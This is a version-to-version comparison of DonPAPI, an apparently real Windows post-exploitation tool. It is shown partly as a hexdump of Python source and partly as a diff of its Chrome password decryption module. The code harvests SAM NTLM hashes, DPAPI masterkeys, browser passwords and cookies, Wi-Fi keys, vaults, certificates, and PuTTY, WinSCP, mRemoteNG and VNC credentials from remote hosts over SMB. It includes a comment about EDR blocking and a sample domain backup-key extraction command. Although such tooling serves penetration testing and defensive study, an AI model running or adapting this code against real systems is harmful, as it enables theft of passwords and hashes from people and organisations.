+00019df0: 0909 0923 204f 6e20 6e65 206c 2761 6a6f  ...# On ne l'ajo
+00019e00: 7574 6520 7061 7320 6175 7820 6372 6564  ute pas aux cred
+00019e10: 7a2c 2063 2765 7374 2075 6e20 6861 7368  z, c'est un hash
+00019e20: 204e 544c 4d2c 2069 6c20 6e65 2070 6575   NTLM, il ne peu
+00019e30: 7420 7061 7320 6574 7265 2075 7469 6c69  t pas etre utili
+00019e40: 73c3 a920 7061 7220 6470 6170 690a 0909  s.. par dpapi...
+00019e50: 0909 0909 2727 270a 0909 0909 0909 6966  ....'''.......if
+00019e60: 2075 7365 726e 616d 652e 6465 636f 6465   username.decode
+00019e70: 2827 7574 662d 3827 2920 6e6f 7420 696e  ('utf-8') not in
+00019e80: 2073 656c 662e 6f70 7469 6f6e 732e 6372   self.options.cr
+00019e90: 6564 7a3a 0a09 0909 0909 0909 7365 6c66  edz:........self
+00019ea0: 2e6f 7074 696f 6e73 2e63 7265 647a 5b75  .options.credz[u
+00019eb0: 7365 726e 616d 652e 6465 636f 6465 2827  sername.decode('
+00019ec0: 7574 662d 3827 295d 203d 205b 6e74 6c6d  utf-8')] = [ntlm
+00019ed0: 2e64 6563 6f64 6528 2775 7466 2d38 2729  .decode('utf-8')
+00019ee0: 5d0a 0909 0909 0909 656c 7365 3a0a 0909  ].......else:...
+00019ef0: 0909 0909 0969 6620 6e74 6c6d 2e64 6563  .....if ntlm.dec
+00019f00: 6f64 6528 2775 7466 2d38 2729 206e 6f74  ode('utf-8') not
+00019f10: 2069 6e20 7365 6c66 2e6f 7074 696f 6e73   in self.options
+00019f20: 2e63 7265 647a 5b75 7365 726e 616d 652e  .credz[username.
+00019f30: 6465 636f 6465 2827 7574 662d 3827 295d  decode('utf-8')]
+00019f40: 3a0a 0909 0909 0909 0909 7365 6c66 2e6f  :.........self.o
+00019f50: 7074 696f 6e73 2e63 7265 647a 5b75 7365  ptions.credz[use
+00019f60: 726e 616d 652e 6465 636f 6465 2827 7574  rname.decode('ut
+00019f70: 662d 3827 295d 2e61 7070 656e 6428 6e74  f-8')].append(nt
+00019f80: 6c6d 2e64 6563 6f64 6528 2775 7466 2d38  lm.decode('utf-8
+00019f90: 2729 290a 0909 0909 0909 2727 270a 0909  ')).......'''...
+00019fa0: 0909 0909 2323 2323 2323 2323 2323 2323  ....############
+00019fb0: 5052 4f43 4553 5349 4e47 2044 4154 410a  PROCESSING DATA.
+00019fc0: 0909 0909 0909 7365 6c66 2e64 622e 6164  ......self.db.ad
+00019fd0: 645f 6372 6564 7a28 6372 6564 7a5f 7479  d_credz(credz_ty
+00019fe0: 7065 3d27 5341 4d27 2c0a 0909 0909 0909  pe='SAM',.......
+00019ff0: 0909 0909 2020 6372 6564 7a5f 7573 6572  ....  credz_user
+0001a000: 6e61 6d65 3d75 7365 726e 616d 652e 6465  name=username.de
+0001a010: 636f 6465 2827 7574 662d 3827 292c 0a09  code('utf-8'),..
+0001a020: 0909 0909 0909 0909 0920 2063 7265 647a  .........  credz
+0001a030: 5f70 6173 7377 6f72 643d 6e74 6c6d 2e64  _password=ntlm.d
+0001a040: 6563 6f64 6528 2775 7466 2d38 2729 2c0a  ecode('utf-8'),.
+0001a050: 0909 0909 0909 0909 0909 2020 6372 6564  ..........  cred
+0001a060: 7a5f 7461 7267 6574 3d27 272c 0a09 0909  z_target='',....
+0001a070: 0909 0909 0909 0920 2063 7265 647a 5f70  .......  credz_p
+0001a080: 6174 683d 746d 705f 6669 6c65 6465 7374  ath=tmp_filedest
+0001a090: 2c0a 0909 0909 0909 0909 0909 2020 7069  ,...........  pi
+0001a0a0: 6c6c 6167 6564 5f66 726f 6d5f 636f 6d70  llaged_from_comp
+0001a0b0: 7574 6572 5f69 703d 7365 6c66 2e6f 7074  uter_ip=self.opt
+0001a0c0: 696f 6e73 2e74 6172 6765 745f 6970 2c0a  ions.target_ip,.
+0001a0d0: 0909 0909 0909 0909 0909 2020 7069 6c6c  ..........  pill
+0001a0e0: 6167 6564 5f66 726f 6d5f 7573 6572 6e61  aged_from_userna
+0001a0f0: 6d65 3d27 4d41 4348 494e 4524 2729 0a09  me='MACHINE$')..
+0001a100: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e69  ..self.logging.i
+0001a110: 6e66 6f28 0a09 0909 0966 225b 7b73 656c  nfo(.....f"[{sel
+0001a120: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
+0001a130: 5f69 707d 5d20 5b2b 5d20 7b62 636f 6c6f  _ip}] [+] {bcolo
+0001a140: 7273 2e4f 4b42 4c55 457d 2053 414d 203a  rs.OKBLUE} SAM :
+0001a150: 2043 6f6c 6c65 6374 6564 207b 6263 6f6c   Collected {bcol
+0001a160: 6f72 732e 4f4b 4752 4545 4e7d 7b6c 656e  ors.OKGREEN}{len
+0001a170: 2873 616d 5f64 6174 6129 7d20 6861 7368  (sam_data)} hash
+0001a180: 6573 207b 6263 6f6c 6f72 732e 454e 4443  es {bcolors.ENDC
+0001a190: 7d22 290a 0909 2320 6c6f 6767 696e 672e  }")...# logging.
+0001a1a0: 6765 744c 6f67 6765 7228 292e 7365 744c  getLogger().setL
+0001a1b0: 6576 656c 286c 6f67 6769 6e67 2e44 4542  evel(logging.DEB
+0001a1c0: 5547 290a 0909 6578 6365 7074 2045 7863  UG)...except Exc
+0001a1d0: 6570 7469 6f6e 2061 7320 6578 3a0a 0909  eption as ex:...
+0001a1e0: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+0001a1f0: 6275 6728 0a09 0909 0966 225b 7b73 656c  bug(.....f"[{sel
+0001a200: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
+0001a210: 5f69 707d 5d20 4578 6365 7074 2072 656d  _ip}] Except rem
+0001a220: 6f74 654f 7073 2053 414d 2229 0a09 0909  oteOps SAM")....
+0001a230: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+0001a240: 7567 2865 7829 0a09 0973 656c 662e 5f5f  ug(ex)...self.__
+0001a250: 7265 6d6f 7465 4f70 732e 6669 6e69 7368  remoteOps.finish
+0001a260: 2829 0a09 0972 6574 7572 6e20 310a 0a09  ()...return 1...
+0001a270: 6465 6620 4765 7452 6563 656e 7446 696c  def GetRecentFil
+0001a280: 6573 2873 656c 6629 3a0a 0909 6d79 5265  es(self):...myRe
+0001a290: 6365 6e74 4669 6c65 7320 3d20 7265 6365  centFiles = rece
+0001a2a0: 6e74 5f66 696c 6573 2873 656c 662e 736d  nt_files(self.sm
+0001a2b0: 622c 2073 656c 662e 6d79 7265 676f 7073  b, self.myregops
+0001a2c0: 2c20 7365 6c66 2e6d 7966 696c 656f 7073  , self.myfileops
+0001a2d0: 2c20 7365 6c66 2e6c 6f67 6769 6e67 2c20  , self.logging, 
+0001a2e0: 7365 6c66 2e6f 7074 696f 6e73 2c20 7365  self.options, se
+0001a2f0: 6c66 2e64 622c 0a09 0909 0909 0909 0909  lf.db,..........
+0001a300: 2073 656c 662e 7573 6572 7329 0a09 096d   self.users)...m
+0001a310: 7952 6563 656e 7446 696c 6573 2e72 756e  yRecentFiles.run
+0001a320: 2829 0a0a 0964 6566 2047 6574 4d52 656d  ()...def GetMRem
+0001a330: 6f74 654e 4728 7365 6c66 293a 0a09 0966  oteNG(self):...f
+0001a340: 726f 6d20 736f 6674 7761 7265 2e6d 616e  rom software.man
+0001a350: 6167 6572 2e6d 5265 6d6f 7465 4e47 2069  ager.mRemoteNG i
+0001a360: 6d70 6f72 7420 6d52 656d 6f74 654e 470a  mport mRemoteNG.
+0001a370: 0909 6d79 4d52 656d 6f74 654e 4720 3d20  ..myMRemoteNG = 
+0001a380: 6d52 656d 6f74 654e 4728 7365 6c66 2e73  mRemoteNG(self.s
+0001a390: 6d62 2c20 7365 6c66 2e6d 7972 6567 6f70  mb, self.myregop
+0001a3a0: 732c 2073 656c 662e 6d79 6669 6c65 6f70  s, self.myfileop
+0001a3b0: 732c 2073 656c 662e 6c6f 6767 696e 672c  s, self.logging,
+0001a3c0: 2073 656c 662e 6f70 7469 6f6e 732c 2073   self.options, s
+0001a3d0: 656c 662e 6462 2c0a 0909 0909 0909 0909  elf.db,.........
+0001a3e0: 7365 6c66 2e75 7365 7273 290a 0909 6d79  self.users)...my
+0001a3f0: 4d52 656d 6f74 654e 472e 7275 6e28 290a  MRemoteNG.run().
+0001a400: 0a09 6465 6620 4765 7450 7574 7479 2873  ..def GetPutty(s
+0001a410: 656c 6629 3a0a 0909 6672 6f6d 2073 6f66  elf):...from sof
+0001a420: 7477 6172 652e 7379 7361 646d 696e 2e70  tware.sysadmin.p
+0001a430: 7574 7479 2069 6d70 6f72 7420 5075 7474  utty import Putt
+0001a440: 790a 0909 6d79 5075 7474 7920 3d20 5075  y...myPutty = Pu
+0001a450: 7474 7928 7365 6c66 2e73 6d62 2c20 7365  tty(self.smb, se
+0001a460: 6c66 2e6d 7972 6567 6f70 732c 2073 656c  lf.myregops, sel
+0001a470: 662e 6d79 6669 6c65 6f70 732c 2073 656c  f.myfileops, sel
+0001a480: 662e 6c6f 6767 696e 672c 2073 656c 662e  f.logging, self.
+0001a490: 6f70 7469 6f6e 732c 2073 656c 662e 6462  options, self.db
+0001a4a0: 290a 0909 6d79 5075 7474 792e 7275 6e28  )...myPutty.run(
+0001a4b0: 290a 0a09 6465 6620 4765 7457 696e 7363  )...def GetWinsc
+0001a4c0: 7028 7365 6c66 293a 0a09 0966 726f 6d20  p(self):...from 
+0001a4d0: 736f 6674 7761 7265 2e73 7973 6164 6d69  software.sysadmi
+0001a4e0: 6e2e 7769 6e73 6370 2069 6d70 6f72 7420  n.winscp import 
+0001a4f0: 5769 6e73 6370 0a09 096d 7957 696e 7363  Winscp...myWinsc
+0001a500: 7020 3d20 5769 6e73 6370 2873 656c 662e  p = Winscp(self.
+0001a510: 736d 622c 2073 656c 662e 6d79 7265 676f  smb, self.myrego
+0001a520: 7073 2c20 7365 6c66 2e6d 7966 696c 656f  ps, self.myfileo
+0001a530: 7073 2c20 7365 6c66 2e6c 6f67 6769 6e67  ps, self.logging
+0001a540: 2c20 7365 6c66 2e6f 7074 696f 6e73 2c20  , self.options, 
+0001a550: 7365 6c66 2e64 6229 0a09 096d 7957 696e  self.db)...myWin
+0001a560: 7363 702e 7275 6e28 290a 0a09 6465 6620  scp.run()...def 
+0001a570: 4765 744e 6577 5f4d 6f64 756c 6528 7365  GetNew_Module(se
+0001a580: 6c66 293a 0a09 096d 794e 6577 4d6f 6475  lf):...myNewModu
+0001a590: 6c65 203d 206e 6577 5f6d 6f64 756c 6528  le = new_module(
+0001a5a0: 7365 6c66 2e73 6d62 2c20 7365 6c66 2e6d  self.smb, self.m
+0001a5b0: 7972 6567 6f70 732c 2073 656c 662e 6d79  yregops, self.my
+0001a5c0: 6669 6c65 6f70 732c 2073 656c 662e 6c6f  fileops, self.lo
+0001a5d0: 6767 696e 672c 2073 656c 662e 6f70 7469  gging, self.opti
+0001a5e0: 6f6e 732c 2073 656c 662e 6462 2c0a 0909  ons, self.db,...
+0001a5f0: 0909 0909 0909 2073 656c 662e 7573 6572  ...... self.user
+0001a600: 7329 0a09 096d 794e 6577 4d6f 6475 6c65  s)...myNewModule
+0001a610: 2e72 756e 2829 0a0a 0964 6566 2047 6574  .run()...def Get
+0001a620: 4365 7274 6966 6963 6174 6573 2873 656c  Certificates(sel
+0001a630: 6629 3a0a 0909 6365 7274 6966 6963 6174  f):...certificat
+0001a640: 6573 5f74 7269 6167 6520 3d20 4365 7274  es_triage = Cert
+0001a650: 6966 6963 6174 6573 5472 6961 6765 2873  ificatesTriage(s
+0001a660: 656c 662e 736d 622c 2073 656c 662e 6d79  elf.smb, self.my
+0001a670: 7265 676f 7073 2c20 7365 6c66 2e6d 7966  regops, self.myf
+0001a680: 696c 656f 7073 2c20 7365 6c66 2e6c 6f67  ileops, self.log
+0001a690: 6769 6e67 2c20 7365 6c66 2e6f 7074 696f  ging, self.optio
+0001a6a0: 6e73 2c0a 0909 0909 0909 0909 0909 0909  ns,.............
+0001a6b0: 2073 656c 662e 6462 2c20 7365 6c66 2e75   self.db, self.u
+0001a6c0: 7365 7273 2c20 7365 6c66 2e75 7365 725f  sers, self.user_
+0001a6d0: 6b65 792c 2073 656c 662e 6d61 6368 696e  key, self.machin
+0001a6e0: 655f 6b65 7929 0a09 0963 6572 7469 6669  e_key)...certifi
+0001a6f0: 6361 7465 735f 7472 6961 6765 2e72 756e  cates_triage.run
+0001a700: 2829 0a0a 0964 6566 2064 6f5f 7465 7374  ()...def do_test
+0001a710: 2873 656c 6629 3a0a 0909 7472 793a 0a09  (self):...try:..
+0001a720: 0909 6966 2073 656c 662e 6164 6d69 6e5f  ..if self.admin_
+0001a730: 7072 6976 7320 616e 6420 5472 7565 3a0a  privs and True:.
+0001a740: 0909 0909 2320 7365 6c66 2e64 6f5f 696e  ....# self.do_in
+0001a750: 666f 2829 0a09 0909 0973 656c 662e 646f  fo().....self.do
+0001a760: 5f77 686f 2829 0a09 0909 0973 656c 662e  _who().....self.
+0001a770: 6765 745f 7573 6572 7328 290a 0909 0909  get_users().....
+0001a780: 230a 0a09 0909 0969 6620 7365 6c66 2e6f  #......if self.o
+0001a790: 7074 696f 6e73 2e6e 6f5f 7265 6d6f 7465  ptions.no_remote
+0001a7a0: 6f70 7320 3d3d 2046 616c 7365 3a0a 0909  ops == False:...
+0001a7b0: 0909 0974 7279 3a0a 0909 0909 0909 7365  ...try:.......se
+0001a7c0: 6c66 2e74 6573 745f 7265 6d6f 7465 4f70  lf.test_remoteOp
+0001a7d0: 7328 290a 0909 0909 0965 7863 6570 7420  s()......except 
+0001a7e0: 4578 6365 7074 696f 6e20 6173 2065 783a  Exception as ex:
+0001a7f0: 0a09 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
+0001a800: 696e 672e 6465 6275 6728 0a09 0909 0909  ing.debug(......
+0001a810: 0909 6622 5b7b 7365 6c66 2e6f 7074 696f  ..f"[{self.optio
+0001a820: 6e73 2e74 6172 6765 745f 6970 7d5d 2045  ns.target_ip}] E
+0001a830: 7863 6570 7469 6f6e 2069 6e20 5265 6d6f  xception in Remo
+0001a840: 7465 4f70 7320 2d20 4d61 7962 6520 626c  teOps - Maybe bl
+0001a850: 6f63 6b65 6420 6279 2045 4452 203f 2022  ocked by EDR ? "
+0001a860: 290a 0909 0909 0909 7365 6c66 2e6c 6f67  ).......self.log
+0001a870: 6769 6e67 2e64 6562 7567 2866 2265 7863  ging.debug(f"exc
+0001a880: 6570 7469 6f6e 2077 6173 203a 207b 6578  eption was : {ex
+0001a890: 7d22 290a 0909 0909 2320 7365 6c66 2e0a  }").....# self..
+0001a8a0: 0909 0909 6966 2073 656c 662e 6f70 7469  ....if self.opti
+0001a8b0: 6f6e 732e 6e6f 5f64 7061 7069 203d 3d20  ons.no_dpapi == 
+0001a8c0: 4661 6c73 653a 0a09 0909 0909 7365 6c66  False:......self
+0001a8d0: 2e67 6574 5f6d 6173 7465 726b 6579 7328  .get_masterkeys(
+0001a8e0: 290a 0909 0909 0973 656c 662e 4765 745f  )......self.Get_
+0001a8f0: 4450 4150 495f 5072 6f74 6563 7465 645f  DPAPI_Protected_
+0001a900: 4669 6c65 7328 290a 0909 0909 0973 656c  Files()......sel
+0001a910: 662e 4765 7457 6966 6928 290a 0909 0909  f.GetWifi().....
+0001a920: 0973 656c 662e 4765 7456 6175 6c74 7328  .self.GetVaults(
+0001a930: 290a 0909 0909 0973 656c 662e 4765 7443  )......self.GetC
+0001a940: 6572 7469 6669 6361 7465 7328 290a 0909  ertificates()...
+0001a950: 0909 6966 2073 656c 662e 6f70 7469 6f6e  ..if self.option
+0001a960: 732e 6e6f 5f62 726f 7773 6572 203d 3d20  s.no_browser == 
+0001a970: 4661 6c73 653a 0a09 0909 0909 7365 6c66  False:......self
+0001a980: 2e47 6574 4368 726f 6d65 5365 6372 6574  .GetChromeSecret
+0001a990: 7328 290a 0909 0909 0973 656c 662e 4765  s()......self.Ge
+0001a9a0: 7445 6467 6553 6563 7265 7473 2829 0a09  tEdgeSecrets()..
+0001a9b0: 0909 0909 7365 6c66 2e47 6574 4d6f 7a69  ....self.GetMozi
+0001a9c0: 6c6c 6153 6563 7265 7473 5f77 7261 7070  llaSecrets_wrapp
+0001a9d0: 6572 2829 0a09 0909 0969 6620 7365 6c66  er().....if self
+0001a9e0: 2e6f 7074 696f 6e73 2e6e 6f5f 7379 7361  .options.no_sysa
+0001a9f0: 646d 696e 7320 3d3d 2046 616c 7365 3a0a  dmins == False:.
+0001aa00: 0909 0909 0973 656c 662e 4765 744d 5265  .....self.GetMRe
+0001aa10: 6d6f 7465 4e47 2829 0a09 0909 0909 7365  moteNG()......se
+0001aa20: 6c66 2e47 6574 5075 7474 7928 290a 0909  lf.GetPutty()...
+0001aa30: 0909 0973 656c 662e 4765 7457 696e 7363  ...self.GetWinsc
+0001aa40: 7028 290a 0909 0909 0969 6620 7365 6c66  p()......if self
+0001aa50: 2e6f 7074 696f 6e73 2e6e 6f5f 766e 6320  .options.no_vnc 
+0001aa60: 3d3d 2046 616c 7365 3a0a 0909 0909 0909  == False:.......
+0001aa70: 7365 6c66 2e47 6574 564e 4328 290a 0909  self.GetVNC()...
+0001aa80: 0909 6966 2073 656c 662e 6f70 7469 6f6e  ..if self.option
+0001aa90: 732e 6e6f 5f72 6563 656e 7420 3d3d 2046  s.no_recent == F
+0001aaa0: 616c 7365 3a0a 0909 0909 0973 656c 662e  alse:......self.
+0001aab0: 4765 7452 6563 656e 7446 696c 6573 2829  GetRecentFiles()
+0001aac0: 0a0a 0909 0909 2222 220a 0909 0909 2a2a  ......""".....**
+0001aad0: 2a44 6576 2079 6f75 7220 6e65 7720 6d6f  *Dev your new mo
+0001aae0: 6475 6c65 2063 6f64 6520 616e 6420 7374  dule code and st
+0001aaf0: 6172 7420 6974 2066 726f 6d20 6865 7265  art it from here
+0001ab00: 0a0a 0909 0909 6966 2073 656c 662e 6f70  ......if self.op
+0001ab10: 7469 6f6e 732e 6e6f 5f6e 6577 5f6d 6f64  tions.no_new_mod
+0001ab20: 756c 6520 3d3d 2046 616c 7365 3a0a 0909  ule == False:...
+0001ab30: 0909 0973 656c 662e 4765 744e 6577 5f4d  ...self.GetNew_M
+0001ab40: 6f64 756c 6528 290a 0909 0909 2222 220a  odule().....""".
+0001ab50: 0a09 0909 0923 2073 656c 662e 6c6f 6767  .....# self.logg
+0001ab60: 696e 672e 696e 666f 2866 225b 7b73 656c  ing.info(f"[{sel
+0001ab70: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
+0001ab80: 5f69 707d 5d20 7b62 636f 6c6f 7273 2e4f  _ip}] {bcolors.O
+0001ab90: 4b47 5245 454e 7d2a 2d3d 2d3d 2d3d 2d3d  KGREEN}*-=-=-=-=
+0001aba0: 2d3d 2d3d 2d3d 2d3d 2d3d 2d3d 2d3d 2d3d  -=-=-=-=-=-=-=-=
+0001abb0: 2d3d 2d3d 2d3d 2d3d 2d3d 2d3d 2d3d 2d3d  -=-=-=-=-=-=-=-=
+0001abc0: 2d3d 2d3d 2d3d 2d3d 2a5c 6e7b 6263 6f6c  -=-=-=-=*\n{bcol
+0001abd0: 6f72 732e 454e 4443 7d22 290a 0909 0909  ors.ENDC}").....
+0001abe0: 2320 666f 7220 7573 6572 2069 6e20 7365  # for user in se
+0001abf0: 6c66 2e75 7365 7273 3a0a 0909 0909 2320  lf.users:.....# 
+0001ac00: 7573 6572 2e72 6573 756d 655f 7573 6572  user.resume_user
+0001ac10: 5f69 6e66 6f28 290a 0909 0909 2320 7573  _info().....# us
+0001ac20: 6572 2e72 6573 756d 655f 7365 6372 6574  er.resume_secret
+0001ac30: 7328 290a 0909 0909 2320 656c 7365 3a0a  s().....# else:.
+0001ac40: 0909 0909 2320 4e4f 5420 4144 4d49 4e0a  ....# NOT ADMIN.
+0001ac50: 0909 0909 7365 6c66 2e71 7569 7428 290a  ....self.quit().
+0001ac60: 0a0a 0909 6578 6365 7074 2045 7863 6570  ....except Excep
+0001ac70: 7469 6f6e 2061 7320 6578 3a0a 0909 0973  tion as ex:....s
+0001ac80: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+0001ac90: 6728 6622 5b7b 7365 6c66 2e6f 7074 696f  g(f"[{self.optio
+0001aca0: 6e73 2e74 6172 6765 745f 6970 7d5d 204e  ns.target_ip}] N
+0001acb0: 6f74 2063 6f6e 6e65 6374 6564 2229 0a09  ot connected")..
+0001acc0: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+0001acd0: 6562 7567 2866 2265 7863 6570 7469 6f6e  ebug(f"exception
+0001ace0: 2077 6173 203a 207b 6578 7d22 290a 0a09   was : {ex}")...
+0001acf0: 6465 6620 6765 745f 7365 6372 6574 7328  def get_secrets(
+0001ad00: 7365 6c66 293a 0a09 0961 6c6c 5f73 6563  self):...all_sec
+0001ad10: 7265 7473 203d 207b 7d0a 0909 666f 7220  rets = {}...for 
+0001ad20: 7573 6572 2069 6e20 7365 6c66 2e75 7365  user in self.use
+0001ad30: 7273 3a0a 0909 0961 6c6c 5f73 6563 7265  rs:....all_secre
+0001ad40: 7473 5b75 7365 725d 203d 2075 7365 722e  ts[user] = user.
+0001ad50: 6765 745f 7365 6372 6574 7328 290a 0a23  get_secrets()..#
+0001ad60: 2044 5041 5049 2075 6e70 726f 7465 6374   DPAPI unprotect
+0001ad70: 0a23 2044 5041 5049 2064 6563 7279 7074  .# DPAPI decrypt
+0001ad80: 4d61 7374 6572 6b65 790a 2320 4450 4150  Masterkey.# DPAP
+0001ad90: 4920 4765 7444 6f6d 6169 6e42 6163 6b75  I GetDomainBacku
+0001ada0: 704d 6173 7465 724b 6579 0a23 2064 7061  pMasterKey.# dpa
+0001adb0: 7069 2e70 7920 6261 636b 7570 6b65 7973  pi.py backupkeys
+0001adc0: 202d 7420 544f 5546 2f41 646d 696e 6973   -t TOUF/Adminis
+0001add0: 7472 6174 6575 723a 7878 7878 7840 3130  trateur:xxxxx@10
+0001ade0: 2e30 2e30 2e31 3020 2d2d 6578 706f 7274  .0.0.10 --export
+0001adf0: 0a23 2074 6f20 6765 7420 4472 6f70 626f  .# to get Dropbo
+0001ae00: 7820 6465 6372 7970 7465 6420 6461 7461  x decrypted data
+0001ae10: 6261 7365 733f 0a23 2074 6f20 6765 7420  bases?.# to get 
+0001ae20: 6943 6c6f 7564 2061 7574 6865 6e74 6963  iCloud authentic
+0001ae30: 6174 696f 6e20 746f 6b65 6e73 3f0a 2320  ation tokens?.# 
+0001ae40: 746f 2064 6563 7279 7074 2045 4653 2066  to decrypt EFS f
+0001ae50: 696c 6573 0a0a 2320 4144 436f 6e6e 6563  iles..# ADConnec
+0001ae60: 7420 2750 726f 6772 616d 2046 696c 6573  t 'Program Files
+0001ae70: 5c4d 6963 726f 736f 6674 2041 7a75 7265  \Microsoft Azure
+0001ae80: 2041 4420 5379 6e63 5c44 6174 615c 4144   AD Sync\Data\AD
+0001ae90: 5379 6e63 2e6d 6466 270a 2320 5072 6f67  Sync.mdf'.# Prog
+0001aea0: 7261 6d20 4669 6c65 735c 4d69 6372 6f73  ram Files\Micros
+0001aeb0: 6f66 7420 417a 7572 6520 4144 2053 796e  oft Azure AD Syn
+0001aec0: 635c 4461 7461 5c41 4453 796e 635f 6c6f  c\Data\ADSync_lo
+0001aed0: 672e 6c64 660a 2320 6f70 7469 6d69 7361  g.ldf.# optimisa
+0001aee0: 7469 6f6e 203a 0a23 206c 6520 7573 6572  tion :.# le user
+0001aef0: 2065 7374 2069 6c20 6475 2064 6f6d 6169   est il du domai
+0001af00: 6e20 6f75 206c 6f63 616c 203f 0a23 2064  n ou local ?.# d
+0001af10: 616e 7320 7175 656c 2063 6173 2070 6575  ans quel cas peu
+0001af20: 7420 6f6e 2064 6563 6869 6666 6672 6572  t on dechifffrer
+0001af30: 2061 7665 6320 6c65 7320 6861 7368 7320   avec les hashs 
+0001af40: 3f20 2f2f 2073 6920 636f 6d70 7465 2061  ? // si compte a
+0001af50: 646d 696e 206f 6e20 7365 2073 6572 7420  dmin on se sert 
+0001af60: 6465 7320 6861 7368 206c 6f63 6175 782f  des hash locaux/
+0001af70: 7361 6d20 3f0a 0a23 2044 4556 203a 2020  sam ?..# DEV :  
+0001af80: 5b67 6574 5f66 696c 655d 2053 4d42 2053  [get_file] SMB S
+0001af90: 6573 7369 6f6e 4572 726f 723a 2053 5441  essionError: STA
+0001afa0: 5455 535f 5348 4152 494e 475f 5649 4f4c  TUS_SHARING_VIOL
+0001afb0: 4154 494f 4e28 4120 6669 6c65 2063 616e  ATION(A file can
+0001afc0: 6e6f 7420 6265 206f 7065 6e65 6420 6265  not be opened be
+0001afd0: 6361 7573 6520 7468 6520 7368 6172 6520  cause the share 
+0001afe0: 6163 6365 7373 2066 6c61 6773 2061 7265  access flags are
+0001aff0: 2069 6e63 6f6d 7061 7469 626c 652e 290a   incompatible.).
```

### Comparing `donpapi-1.0.1/donpapi/myusers.py` & `donpapi-1.1.0/donpapi/myusers.py`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/res/Logo_LOGIN.PNG` & `donpapi-1.1.0/donpapi/res/Logo_LOGIN.PNG`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/res/style.css` & `donpapi-1.1.0/donpapi/res/style.css`

 * *Files identical despite different names*

### Comparing `donpapi-1.0.1/donpapi/software/browser/chrome_decrypt.py` & `donpapi-1.1.0/donpapi/software/browser/chrome_decrypt.py`

 * *Files 6% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import sys
 import sqlite3,os,json,base64,binascii
 from datetime import datetime,timedelta
 from donpapi.lib.toolbox import bcolors
 from donpapi.lib.dpapi import *
 
 class CHROME_LOGINS:
-	def __init__(self, options,logger,db,username):
+	def __init__(self, options,logger,db,username,type ="Chrome"):
 		self.logindata_path = None
 		self.localstate_path = None
 		self.localstate_dpapi = None
 		self.cookie_path = None
 		self.version_path = None
 		self.options = options
 		self.logging= logger
@@ -17,41 +17,40 @@
 		self.aeskey = None
 		self.masterkey = None
 		self.masterkey_guid = None
 		self.logins = {}
 		self.cookies = {}
 		self.db=db
 		self.version=''
+		self.type= type
 
 	def get_masterkey_guid_from_localstate(self):
 		try:
 			if self.localstate_path!=None:
 				if os.path.isfile(self.localstate_path):
 					with open(self.localstate_path, "rb") as f:
 						localfile_datas = json.load(f)
-						#print(localfile_datas)
 						key_blob = localfile_datas['os_crypt']['encrypted_key']
 						blob = base64.b64decode(key_blob)
-						#print(blob)
 						if blob[:5] == b'DPAPI':
-							self.logging.debug(f"[{self.options.target_ip}] [Chrome decoding] found DPAPI blob : {binascii.hexlify(blob[5:])}")
+							self.logging.debug(f"[{self.options.target_ip}] [{self.type} decoding] found DPAPI blob : {binascii.hexlify(blob[5:])}")
 							blob = blob[5:]
 							self.localstate_dpapi=DPAPI(self.options,self.logging)
 							#mydpapi = DPAPI(myoptions, self.logging)
 							guid = self.localstate_dpapi.find_Blob_masterkey(raw_data=blob)
 							self.logging.debug(f"[{self.options.target_ip}] Looking for masterkey : {guid}")
 							if guid != None:
 								self.masterkey_guid=guid
 								return self.masterkey_guid
 						else:
-							self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Erro getting en DPAPI Blob from Chrome localstate file{bcolors.ENDC}")
+							self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Erro getting en DPAPI Blob from {self.type} localstate file{bcolors.ENDC}")
 							return None
 		except Exception as ex:
 			self.logging.debug(
-				f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Blob for Chrome{bcolors.ENDC}")
+				f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Blob for {self.type}{bcolors.ENDC}")
 			self.logging.debug(ex)
 			return None
 
 
 	def get_AES_key_from_localstate(self,masterkey=None):
 		if self.aeskey!=None:
 			return self.aeskey
@@ -88,130 +87,130 @@
 				iv = nonce  # buff[3:15]
 				payload = enc_password[15:]
 				#tag = enc_password[-16:]
 				cipher = AES.new(self.aeskey, AES.MODE_GCM, iv)
 				decrypted_pass = cipher.decrypt(payload)[:-16]#Removing bloc of padded data
 				decrypted_pass = decrypted_pass.decode('utf-8')
 				if decrypted_pass != None:
-					self.logging.debug(f"[{self.options.target_ip}] Decrypted Chrome password : {decrypted_pass}")
+					self.logging.debug(f"[{self.options.target_ip}] Decrypted {self.type} password : {decrypted_pass}")
 					return decrypted_pass
 				else:
-					self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Error in decrypt Chrome password {bcolors.ENDC}")
+					self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Error in decrypt {self.type} password {bcolors.ENDC}")
 					return None
 			else :
-				self.logging.debug(f"[{self.options.target_ip}] Got a Chrome Version : {enc_password[:3]} NOT IMPLEMENTED")
+				self.logging.debug(f"[{self.options.target_ip}] Got a {self.type} Version : {enc_password[:3]} NOT IMPLEMENTED")
 				#c'est du DPAPI ?
 			#Win32CryptUnprotectData(password, is_current_user=constant.is_current_user, user_dpapi=constant.user_dpapi)  user_dpapi=constant.user_dpapi)
 		except Exception as ex:
-			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypt_AES_chrome_password Chrome{bcolors.ENDC}")
+			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypt_AES_chrome_password {self.type}{bcolors.ENDC}")
 			self.logging.debug(ex)
 			return None
 
 
 
 	def decrypt_chrome_LoginData(self):
 		#path = '192.168.20.141\\Users\\Administrateur.TOUF\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
 		try:
